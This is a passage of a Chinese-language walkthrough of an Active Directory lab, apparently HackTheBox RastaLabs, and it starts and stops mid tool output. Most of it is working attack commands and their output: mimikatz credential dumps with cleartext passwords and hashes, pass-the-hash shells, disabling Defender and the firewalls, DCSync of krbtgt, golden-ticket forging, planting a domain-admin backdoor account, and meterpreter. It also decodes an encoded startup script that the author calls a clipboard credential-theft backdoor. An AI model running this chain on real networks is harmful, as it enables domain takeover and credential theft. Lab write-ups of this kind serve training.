    lm  -20: 711d6c1431b391d90a99dd3250d74855
    lm  -21: 41f8633138c44546498dbc1b6284849d
    lm  -22: 426081ae07f12d1fb078009581d096c1
    lm  -23: 4ef0cc4bbb287018b9dbe3c8aab83973
    ntlm- 0: 05579b017d2931f3bc631ab7f384ece0
    ntlm- 1: 3032e2cc3d8ee62b0308ccdb28b4a060
    ntlm- 2: 0597274bd8bae4cbffef5c66706495c3
    ntlm- 3: 0df749fb57b70e88d8dd294b6f4ecd62
    ntlm- 4: 69efa17f451135a0d91360b776117eef
    ntlm- 5: 07f499d6a54862c2cff1fd12c633e9d0
    ntlm- 6: 48aea8f2e02033f25b14b1147562245b
    ntlm- 7: 978bbdeb715b18ef976b0c8c466c78f6
    ntlm- 8: a99b5bdef10e37aae712ea69377a0c05
    ntlm- 9: 43ce83db3826e2bcbda0004725b02ffd
    ntlm-10: ebbe4c11b0823952be1a6f196db51be0
    ntlm-11: 2537ce75f6604b230196faaec7830a1f
    ntlm-12: 5413d0b41eff968020a5c25eb1982dfc
    ntlm-13: adb3fbb2867532ba9b1ffbb0413a68f9
    ntlm-14: e1a156766056c970ad19a9330781ed00
    ntlm-15: 3ba96223d050a41dab32ce880c72b0ce
    ntlm-16: 9e2ed4e9ec762d317fad026946298b25
    ntlm-17: c367aaf6f58738e78d2303b2448e81f5
    ntlm-18: 146a775bd7f23a8689eeaae172a186b8
    ntlm-19: 3a7475be8ed90228c46a7ddd6be5fd72
    ntlm-20: 67c75c47ad127ce4fdf0e003e8eb2595
    ntlm-21: 1ea4a49278706e2595b42d43a8a4a437
    ntlm-22: a4a91047ff0da9c146986b4ce55457f0
    ntlm-23: 397bf370bf4ccc62d73c07584799b0ff

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

mimikatz(commandline) # exit
Bye!
```

## FS01-凭据整理
### SAM 本地账户凭据
来自 `lsadump::sam`

主机：`FS01`

| RID | 用户 | NTLM Hash |
| --- | --- | --- |
| 500 | Administrator | `05579b017d2931f3bc631ab7f384ece0` |
| 501 | Guest | 无 |
| 503 | DefaultAccount | 无 |


说明：

+ **Administrator NTLM**

```plain
05579b017d2931f3bc631ab7f384ece0
```

这是 **本机管理员 hash**

常见用途：

+ Pass The Hash
+ SMB / WMI / WinRM 横向

---

### LSASS 登录凭据
来自 `sekurlsa::logonpasswords`

#### 1️⃣ 域管理员账户
用户：

```plain
rweston_da
```

域：

```plain
RLAB
```

NTLM：

```plain
3ff61fa259deee15e4042159d7b832fa
```

权限：

很明显是 **Domain Admin**

---

#### 2️⃣ 域管理员账户2
用户：

```plain
epugh_adm
```

域：

```plain
RLAB
```

NTLM：

```plain
8bfd10f0484f52314831296e66ef7c51
```

最重要的是这里：

```plain
Password : IReallyH8LongPasswords!
```

所以得到：

| 用户 | 域 | 密码 |
| --- | --- | --- |
| epugh_adm | RLAB | **IReallyH8LongPasswords!** |


---

### 机器账户
机器：

```plain
FS01$
```

域：

```plain
RLAB
```

NTLM：

```plain
eed2715e728dbf1873827ea000e1ce07
```

用途：

+ Kerberos delegation
+ RBCD
+ silver ticket
+ s4u

---

### 完整凭据整理
#### 明文密码
```plain
RLAB\epugh_adm
Password: IReallyH8LongPasswords!
```

---

#### 域管理员 Hash
```plain
RLAB\rweston_da
NTLM: 3ff61fa259deee15e4042159d7b832fa
```

---

#### 域管理员 Hash2
```plain
RLAB\epugh_adm
NTLM: 8bfd10f0484f52314831296e66ef7c51
```

---

#### 本地管理员
```plain
FS01\Administrator
NTLM: 05579b017d2931f3bc631ab7f384ece0
```

---

# DC01-10.10.120.1-RASTALABS.LOCAL\rweston_da
## Smbexec
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q impacket-smbexec rweston_da@10.10.120.1 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

## wmiexec
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q impacket-wmiexec rweston_da@10.10.120.1 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rlab\rweston_da
```

## Getflag
```plain
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
RASTA{r4574l4b5_ch4mp10n}
```

## 禁用defender
```plain
# 1. 修改注册表禁用实时保护
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

# 2. 重启 Defender 服务
Start-Service -Name WinDefend

# 3. 现在可以复制文件了
Copy-Item \\tsclient\share\minikatz\x64\mimikatz.exe C:\Users\Public\
```

## mimikatz
### Add-MpPreference
```plain
powershell -c "Add-MpPreference -ExclusionPath C:\Users\Public"
```

### smbclient
```plain
proxychains -q impacket-smbclient rweston_da@10.10.120.1 -hashes :3ff61fa259deee15e4042159d7b832fa
```

### put
```plain
proxychains -q impacket-smbclient rweston_da@10.10.120.1 -hashes :3ff61fa259deee15e4042159d7b832fa
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# use C$
# cd Users/Public/
# put /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe
#
```

### DCSync
```plain
C:\Users\Public>mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:krbtgt
[DC] 'rastalabs.local' will be the domain
[DC] 'dc01.rastalabs.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 15/10/2017 11:37:22
Object Security ID   : S-1-5-21-1396373213-2872852198-2033860859-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 1b6e14bc52b67a2357f7938a8bbceb1b
    ntlm- 0: 1b6e14bc52b67a2357f7938a8bbceb1b
    lm  - 0: 9e5ac09d73593b271c5961ce4a7a3a71

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e05bdcbb9c3cd6dc60426a9d60b7ad8a

* Primary:Kerberos-Newer-Keys *
    Default Salt : RASTALABS.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7e1e82c3d0a59b749d103744e49f96514cb0f82fe920f1b8ad295686e85184ae
      aes128_hmac       (4096) : 1fa65fdd4896b7a3c338b9f8aeff21f4
      des_cbc_md5       (4096) : f72a64583437f41f

* Primary:Kerberos *
    Default Salt : RASTALABS.LOCALkrbtgt
    Credentials
      des_cbc_md5       : f72a64583437f41f

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  0cd1ed6500dbdc187ddf34211f7ef38a
    02  143235e0347514dde2981263a69320ec
    03  5bbff1f07611fff5e47e5e3c005dbba2
    04  0cd1ed6500dbdc187ddf34211f7ef38a
    05  143235e0347514dde2981263a69320ec
    06  290c0efa2e9eaf361b7d88b075e7c353
    07  0cd1ed6500dbdc187ddf34211f7ef38a
    08  cbac6cac4002b3242dcb8b2afe56cbb3
    09  cbac6cac4002b3242dcb8b2afe56cbb3
    10  70f001154130b1ce76ad168f299ca9d7
    11  d49f0cb2bc02a54f1572884a1a0ad61e
    12  cbac6cac4002b3242dcb8b2afe56cbb3
    13  92067b172ff44535f2515fc976b69b36
    14  d49f0cb2bc02a54f1572884a1a0ad61e
    15  b0daa713d07e27658304062b9583c9e6
    16  b0daa713d07e27658304062b9583c9e6
    17  13395521f90dd573fe178e281f155fec
    18  b2ac68398393d07329d64230c02b9ccb
    19  298f649fbddffc1c9e005a76efc6ab58
    20  5319ae94c5954de20c3c4c7049000fa9
    21  fd05db8f413f43203215492b048afdad
    22  fd05db8f413f43203215492b048afdad
    23  b2e683bd3d58d4ed00076391cdab3ba9
    24  906dbb0de5ac26d701d79e40e1f9d59e
    25  906dbb0de5ac26d701d79e40e1f9d59e
    26  93040ed77cd0319033fdf70ca192996b
    27  3acba24c7642e00fad31e53f69a79020
    28  516c2bc041df29b470dc8d10c2585edf
    29  d007f5506cb70f26132727d14e89f7a6


mimikatz(commandline) # exit
Bye!
```

## 黄金票据
```plain
proxychains -q python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
  -aesKey 7e1e82c3d0a59b749d103744e49f96514cb0f82fe920f1b8ad295686e85184ae \
  -domain-sid S-1-5-21-1396373213-2872852198-2033860859 \
  -domain rastalabs.local \
  -user-id 500 \
  Administrator

export KRB5CCNAME=Administrator.ccache
```

## psexec
```plain
proxychains -q impacket-psexec -k -no-pass Administrator@dc01.rastalabs.local
```

## Getflag
```plain
C:\Users> powershell -Command "Get-EventLog -LogName 'Application' | where {$_.Message -like '*RASTA*'} | select Message | format-table -wrap"
 
Message                               
-------                               
{RASTA{1nc1d3n7_r35p0nd3r5_l0v3_l065}}
```

### 1️⃣ `Get-EventLog -LogName 'Application'`
```plain
┌─────────────────────────────────────────────────────────┐
│  功能：获取 Windows 事件日志中的"应用程序"日志           │
├─────────────────────────────────────────────────────────┤
│  -LogName 'Application'  → 指定日志类型                 │
│                                                         │
│  常见日志类型：                                         │
│  • Application  → 应用程序事件                          │
│  • Security     → 安全事件（登录、权限等）              │
│  • System       → 系统事件                              │
└─────────────────────────────────────────────────────────┘
```

---

### 2️⃣ `| where {$_.Message -like '*RASTA*'}`
```plain
┌─────────────────────────────────────────────────────────┐
│  功能：筛选包含 "RASTA" 字符串的日志条目                │
├─────────────────────────────────────────────────────────┤
│  |              → 管道符，将上一步输出传给下一步        │
│  where {...}    → 过滤条件                             │
│  $_             → 当前处理的对象（每条日志）            │
│  $_ .Message    → 日志的消息内容                        │
│  -like          → 模糊匹配运算符                        │
│  '*RASTA*'      → 包含 RASTA 的任意文本（*是通配符）    │
└─────────────────────────────────────────────────────────┘
```

**示意图：**

```plain
所有日志  →  [过滤]  →  只保留含"RASTA"的日志
   ↓                    ↓
 1000 条               1 条
```

---

### 3️⃣ `| select Message`
```plain
┌─────────────────────────────────────────────────────────┐
│  功能：只选择 Message（消息）字段显示                   │
├─────────────────────────────────────────────────────────┤
│  select         → 选择特定属性                          │
│  Message        → 日志的消息内容字段                    │
│                                                         │
│  日志对象包含多个字段：                                 │
│  • Index        • EventID  • EntryType                 │
│  • Source       • Message   • TimeGenerated            │
│                                                         │
│  这里只关心 Message 内容                                │
└─────────────────────────────────────────────────────────┘
```

---

### 4️⃣ `| format-table -wrap`
```plain
┌─────────────────────────────────────────────────────────┐
│  功能：以表格格式输出，长文本自动换行                   │
├─────────────────────────────────────────────────────────┤
│  format-table   → 格式化为表格显示                      │
│  -wrap          → 长文本自动换行（不截断）              │
└─────────────────────────────────────────────────────────┘
```

**对比：**

```plain
不加 -wrap:    {RASTA{1nc1d3n7_r35p0nd3r5_l0v3_l065}}... (截断)
加 -wrap:      {RASTA{1nc1d3n7_r35p0nd3r5_l0v3_l065}}   (完整显示)
```

---

# RASTALABS.LOCAL-Getflag
## 新建用户
我们在域控写入新用户进行补旗

```plain
net user heathc1iff Pass@123 /add /domain
net group "domain admins" heathc1iff /add /domain
net localgroup "Remote Desktop Users" heathc1iff /add
```

## 域控rdp开启
```plain
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## 域控rdp防火墙
```plain
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
//这会开放：TCP 3389 UDP 3389
```

## 域控关闭所有 Windows 防火墙  
```plain
netsh advfirewall set allprofiles state off
```

## rdp远程连接
```plain
proxychains -q xfreerdp /u:heathc1iff /p:'Pass@123' /d:RASTALABS /v:10.10.120.1 /cert:ignore
```

## DC-创建新的组策略对象 (GPO)
### 步骤 1: 创建新 GPO
```plain
组策略管理控制台 → 右键 "Group Policy Objects" → 新建
名称：RemoteAccess_Policy
```

### 步骤 2: 编辑 GPO 配置
```plain
右键新建的 GPO → 编辑
```

---

###  配置项详解
#### 1️⃣ 开放 RDP 端口 (防火墙规则)
```plain
计算机配置 → 策略 → Windows 设置 → 安全设置 → 
高级安全 Windows 防火墙 → 入站规则 → 新建规则

┌─────────────────────────────────────────────────────────┐
│  规则类型：端口                                         │
│  协议：TCP                                              │
│  端口：3389   //这里我开的是全端口                       │
│  操作：允许连接                                         │
│  配置文件：域、专用、公用 (全选)                        │
│  名称：Allow RDP 3389                                   │
└─────────────────────────────────────────────────────────┘
```

#### 2️⃣ 关闭 Windows 防火墙
```plain
计算机配置 → 策略 → 管理模板 → 网络 → 网络连接 → 
Windows 防火墙 → 域配置文件

┌─────────────────────────────────────────────────────────┐
│  Windows 防火墙： 保护所有网络连接 → 已禁用             │
│  Windows 防火墙: 允许入站远程管理例外 → 已启用          │
└─────────────────────────────────────────────────────────┘
```

#### 3️⃣ 关闭 Windows Defender
```plain
计算机配置 → 策略 → 管理模板 → Windows 组件 → 
Windows Defender

┌─────────────────────────────────────────────────────────┐
│  关闭 Microsoft Defender 防病毒 → 已启用                  │
│  Setting: Turn off Microsoft Defender Antivirus         │                                             
│  关闭实时保护 → 已启用 (Turn off real-time protection)    │
│  关闭行为监控 → 已启用 (Turn off behavior monitoring)    │
└─────────────────────────────────────────────────────────┘
```

---

### 链接 GPO 到域
```plain
右键 rastalabs.local 域 → 链接现有 GPO → 选择 RemoteAccess_Policy
cmd中输入gpupdate /force 刷新GPO规则
```

---

## WS01-10.10.121.112-ReadClip
### evil-winrm
```plain
proxychains -q evil-winrm -i 10.10.121.112 -u heathc1iff -p 'Pass@123'
```

### 启动目录
```plain
*Evil-WinRM* PS C:\Users\heathc1iff\Documents> dir "C:\Users\rweston\Start Menu\Programs\Startup"
 


    Directory: C:\Users\rweston\Start Menu\Programs\Startup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/27/2017   2:08 PM            419 fs01.lnk
------        11/21/2017   4:04 PM           2209 startup.bat
```

### startup.bat
#### <font style="color:rgb(6, 10, 38);">使用 takeown 获取所有权</font>
```plain
# 获取文件所有权
takeown /f "C:\Users\rweston\Start Menu\Programs\Startup\startup.bat"

# 授予完全控制权限
icacls "C:\Users\rweston\Start Menu\Programs\Startup\startup.bat" /grant heathc1iff:F

# 读取文件
type "C:\Users\rweston\Start Menu\Programs\Startup\startup.bat"
```

#### 文件内容
```plain
start /b powershell.exe -nop -w hidden -enc JABTAGUAYwBQAGEAcwBzACAAPQAgACIAMAAxADAAMAAwADAAMAAwAGQAMAA4AGMAOQBkAGQAZgAwADEAMQA1AGQAMQAxADEAOABjADcAYQAwADAAYwAwADQAZgBjADIAOQA3AGUAYgAwADEAMAAwADAAMAAwADAAMQBiADMAMAA5ADIAZQBlAGYANQAxADkANgBmADQAYgBiAGMAMABhAGYAZAAyADYANwBiADYAYgA0ADcAMABiADAAMAAwADAAMAAwADAAMAAwADIAMAAwADAAMAAwADAAMAAwADAAMAAwADMANgA2ADAAMAAwADAAYwAwADAAMAAwADAAMAAwADEAMAAwADAAMAAwADAAMABkADQAOABjADAAMQA3AGUAMwBiADcAZQBiADEAZgBhADgAYwBmADYANAAxADUAYgA3ADMANwA2ADQANABiAGIAMAAwADAAMAAwADAAMAAwADAANAA4ADAAMAAwADAAMABhADAAMAAwADAAMAAwADAAMQAwADAAMAAwADAAMAAwAGUAYgAxADUAZgBiADgANwAzAGMAYQA1ADUAZAAzAGYANgAxADMAMgBhADYANABhAGIANAAwAGQAMQA3ADUAOQAxADgAMAAwADAAMAAwADAAYgBhADUAMABlADIANgAwADYAYgBjAGMAYQA4ADIAMgA1AGIAMgA3ADgAOAA4AGEAYQAxAGUAZQA2AGYAZgAyADYAMwBjADAANgBjADUAYQA4AGMAOQBlADEAZgBjADUAMQA0ADAAMAAwADAAMAAwAGMAOABiADAAMwBkADEAYwA3AGIAOQBkADIAZAA0ADAAZABmAGQAOAAyADgAYwA5AGUANABiAGYAYgAwADMAMgBmADQANwA1ADYAOQA0AGYAIgB8AEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAOwAkAFAAYQBzAHMAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AUABTAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAiAE4ALwBBACIALAAkAFMAZQBjAFAAYQBzAHMAKQAuAEcAZQB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbAAoACkALgBQAGEAcwBzAHcAbwByAGQAOwBXAGgAaQBsAGUAKAAkAHQAcgB1AGUAKQB7AFMAZQB0AC0AQwBsAGkAcABiAG8AYQByAGQAIAAtAFYAYQBsAHUAZQAgACIAaAB0AHQAcABzADoALwAvADEAMAAuADEAMAAuADEAMgAwAC4AMgA1ADQALwAiADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwADsAUwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AVgBhAGwAdQBlACAAJABQAGEAcwBzADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMwAwADAAfQA=
start /b powershell.exe -nop -w hidden -enc VwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxADsAIABpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgAE0AOgApACkAIAB7ACAAJABkAHIAaQB2AGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIAB3AHMAYwByAGkAcAB0AC4AbgBlAHQAdwBvAHIAawA7ACAAJABkAHIAaQB2AGUALgBNAGEAcABOAGUAdAB3AG8AcgBrAEQAcgBpAHYAZQAoACIATQA6ACIALAAgACIAXABcAGYAcwAwADEALgByAGEAcwB0AGEAbABhAGIAcwAuAGwAbwBjAGEAbABcAGgAbwBtAGUAJABcAHIAdwBlAHMAdABvAG4AIgApACAAfQB9AA==
```

#### 第一个脚本
```plain
# Base64 解码后：
$SecPass = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000001b3092eef5196f4bbc0afd267b6b470b000000002000000000003660000c00000000100000000d48c017e3b7eb1fa8cf6415b737644bb000000004800000a00000010000000eb15fb873ca55d3f6132a64ab40d17591800000ba50e2606bcca8225b27888aa1aee6ff263c06c5a8c9e1fc514000000c8b03d1c7b9d2d40dfd828c9e4bfb032f475694f" | ConvertTo-SecureString
$Pass = (New-Object System.Management.Automation.PSCredential "N/A", $SecPass).GetNetworkCredential().Password
While ($true) {
    Set-Clipboard -Value "https://10.10.120.254/"
    Start-Sleep -Seconds 10
    Set-Clipboard -Value $Pass
    Start-Sleep -Seconds 300
}
/*┌─────────────────────────────────────────────────────────────────┐
  │  凭证窃取剪贴板后门！                                             │
  ├─────────────────────────────────────────────────────────────────┤
  │                                                                 │
  │  1. 解密一个硬编码的密码                                          │
  │  2. 每 10 秒将剪贴板设置为 "https://10.10.120.254/"               │
  │  3. 每 300 秒将剪贴板设置为解密的密码                              │
  │  4. 诱导用户复制密码到攻击者服务器！                               │
  │                                                                 │
  │  攻击者服务器：10.10.120.254                                     │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘*/
```

#### 第二个脚本
```plain
# Base64 解码后：
While ($true) { 
    Start-Sleep -Seconds 1
    if (!(Test-Path M:)) { 
        $drive = New-Object -ComObject wscript.network
        $drive.MapNetworkDrive("M:", "\\fs01.rastalabs.local\home$\rweston") 
    }
}

/*┌─────────────────────────────────────────────────────────────────┐
  │  持久化网络驱动器映射！                                           │
  ├─────────────────────────────────────────────────────────────────┤
  │                                                                 │
  │  1. 持续检查 M: 驱动器是否存在                                    │
  │  2. 如果不存在，映射网络驱动器到：                                 │
  │     \\fs01.rastalabs.local\home$\rweston                        │
  │  3. 这是 rweston 的家目录共享！                                   │
  │                                                                 │
  │  文件服务器：fs01.rastalabs.local                                │
  │  共享路径：home$\rweston                                         │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘*/
```

### secretsdump
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-secretsdump rweston_da@10.10.121.112 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x925b96bd0d895c7241d0f3b0c02cc5d9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f0109cca0b23a1177b0fcdf05bc408d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3bdd847d6f1655843123b931cd376e3e:::
[*] Dumping cached domain logon information (domain/username:hash)
RASTALABS.LOCAL/rweston:$DCC2$10240#rweston#3222448ee136fdc979fb4aa12dcd465f: (2026-03-17 03:09:14+00:00)
RASTALABS.LOCAL/Administrator:$DCC2$10240#Administrator#4846fb364be3573b565cdf0b9d1798af: (2024-12-11 05:13:00+00:00)
RASTALABS.LOCAL/rweston_da:$DCC2$10240#rweston_da#24c8e9ab0617120753dc6d5ea9262ea6: (2021-08-13 08:43:08+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RLAB\WS01$:aes256-cts-hmac-sha1-96:4b6af936629e2ac6515c7ebb5112a2e270035cd613e16491c509d44e0020882a
RLAB\WS01$:aes128-cts-hmac-sha1-96:23fc98974125321e4fa2a53e33acdc42
RLAB\WS01$:des-cbc-md5:f23b51fdb95102b0
RLAB\WS01$:plain_password_hex:f9f51532d2747f50b46141947b15a4b417f8ddb900ef93a90b7372d2bc7691f68cc4d0e575f0eed4cdf13519e902048dba66763188cef40bf1673ca7f29a3d9c9b7dead5800529929e61390e67ba74813d52939ec6cb96ac3cd12ec25d821fd32cfad95f7ea65c07e304455e0a7561c10ad4a261c1cd70fe5984bf0dcba640ab0eb48ac08725b3183ff12cfadcc1e70e9c4ae5278f6bcb97adb7e3cd885d68b44c47ab3086c37596492d72273007465124c683ba6c391a74fd93be4ec0da7d3744495b9bc69cab070c0a3ff99c639f80775d6e80db5396e69f57ff6cdc028463a8a908a7e7571f999228761a0eed1938
RLAB\WS01$:aad3b435b51404eeaad3b435b51404ee:f572299a1f571e27a3d3b0670b8d5d1e:::
[*] DefaultPassword 
rastalabs.local\rweston:W0lv3rh@mpt0n!!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1119d1ea42d7040f6833e71ad293c064fbb6ddf5
dpapi_userkey:0xc5d76c219e0e0e6171b0bfff14f5c19322563052
[*] NL$KM 
 0000   84 72 04 2C F3 F6 B2 6A  E5 B9 9E A2 D4 9F 1E 6E   .r.,...j.......n
 0010   69 91 C7 04 17 A5 61 79  25 01 44 0B 96 0B 93 6F   i.....ay%.D....o
 0020   25 37 7D 9F FB 82 1B 4A  AC 99 F1 81 B8 71 9E 01   %7}....J.....q..
 0030   47 9F 2F 92 E4 DA C9 68  B4 B1 0B 0F CC 20 0B 29   G./....h..... .)
NL$KM:8472042cf3f6b26ae5b99ea2d49f1e6e6991c70417a561792501440b960b936f25377d9ffb821b4aac99f181b8719e01479f2f92e4dac968b4b10b0fcc200b29
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

得到凭据rweston:W0lv3rh@mpt0n!!

### mimikatz
#### 上传
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbclient rweston_da@10.10.121.112 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use C$
# cd Users/Public    
# put /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe
# put /home/kali/Desktop/htb/rastalabs/updata.exe
```

#### smbexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbexec rweston_da@10.10.121.112 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\WINDOWS\system32>whoami
nt authority\system
C:\WINDOWS\system32>powershell -c "Add-MpPreference -ExclusionPath C:\Users\heathc1iff\Documents"
C:\WINDOWS\system32>powershell -c "Add-MpPreference -ExclusionPath C:\Users\Public"
C:\WINDOWS\system32>
```

#### psexec
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q impacket-psexec rweston_da@10.10.121.112 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.121.112.....
[*] Found writable share ADMIN$
[*] Uploading file qYBYYuOM.exe
[*] Opening SVCManager on 10.10.121.112.....
[*] Creating service eYIw on 10.10.121.112.....
[*] Starting service eYIw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.4894]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> C:\Users\Public\updata.exe
```

#### msf
##### load kiwi
```plain
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
```

##### kiwi_cmd lsadump::sam
```plain
meterpreter > kiwi_cmd lsadump::sam
Domain : WS01
SysKey : 925b96bd0d895c7241d0f3b0c02cc5d9
Local SID : S-1-5-21-768748716-2572901172-1788308965

SAMKey : 24eece0c1deb1c885b00d780273fa0cd

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 5f0109cca0b23a1177b0fcdf05bc408d
    lm  - 0: dec5a96949330bf60d49a830a5a28acb
    lm  - 1: c1e06e15fa18c99686e7b34e2a7e757c
    lm  - 2: 47c3f996455c011bfd415f3d03ef96d6
    lm  - 3: d12f4c9973628d82a347cf61d0a0f198
    lm  - 4: bd52901e45c1fd62d2d66be8b78c005d
    lm  - 5: 980a3b01d6bb19ff26cbba6284a25910
    lm  - 6: c641c9d76a86ecbca8b6049a28f24e55
    lm  - 7: 0db1c2a6a15123c39693ec09ba6db879
    lm  - 8: 7e61bc452d8000a99fe66455b3fbe38e
    lm  - 9: efe39f89b75d8ebd0a7554174d958b0c
    lm  -10: 8e47c1cff29ea05a7645c452fe254265
    lm  -11: 6b2a1eec18539b5b42ce8b0fb53b7f22
    lm  -12: 8c5ff26a02cf80010e6c11798aa0c4db
    lm  -13: ff555d5305529db39182585c30ba396f
    lm  -14: eff9a753d946df99c2f3eb9cd285c662
    lm  -15: 0ed4353c6ae7a18801622ccb6759999d
    lm  -16: 55e1ce13c31e09504d1648890a76254b
    lm  -17: f18beacc858ad88c754a76330cc91dfb
    lm  -18: aec9ac12ce4625c7b578fd57177db2e9
    lm  -19: 4c9f04ede5d9fcbd9b9010c946e8ea47
    lm  -20: e0acaf39c2292dd1ff9bdc0506828759
    lm  -21: 2ab46f47034162ea299e4993a4ed8d0c
    lm  -22: 34165b0cd9c036bac4807991f48b9354
    lm  -23: c90452a7b64ad8bdab73988ede3a1a37
    ntlm- 0: 5f0109cca0b23a1177b0fcdf05bc408d
    ntlm- 1: 74dab2079e40224dadd51f216716b1db
    ntlm- 2: c577e4487f93f68bccb337af06ba76c3
    ntlm- 3: 3f23d55b4b0c3ab222d2b292d2f00dfc
    ntlm- 4: 705e6f8ebda5b864537295e71da545d2
    ntlm- 5: 990111a1c57bc69f9decc6c53c64634a
    ntlm- 6: b7f0dc48ca4a2a561fec8a321bddece2
    ntlm- 7: e6e4ab4272404955f3819b20ebc22831
    ntlm- 8: b7e78bf4733b1c2171dc6ea05732c5d4
    ntlm- 9: 37c5b89d45ce7505c83210e047e5e065
    ntlm-10: 1968985e89076e0d99b294a26feb2ba7
    ntlm-11: b55d61f44c0e984ca7373203c7c8f3f5
    ntlm-12: f71db54d2c37b544818264a19340db01
    ntlm-13: 7f84612bbe9fede879e69ae3ba7529d3
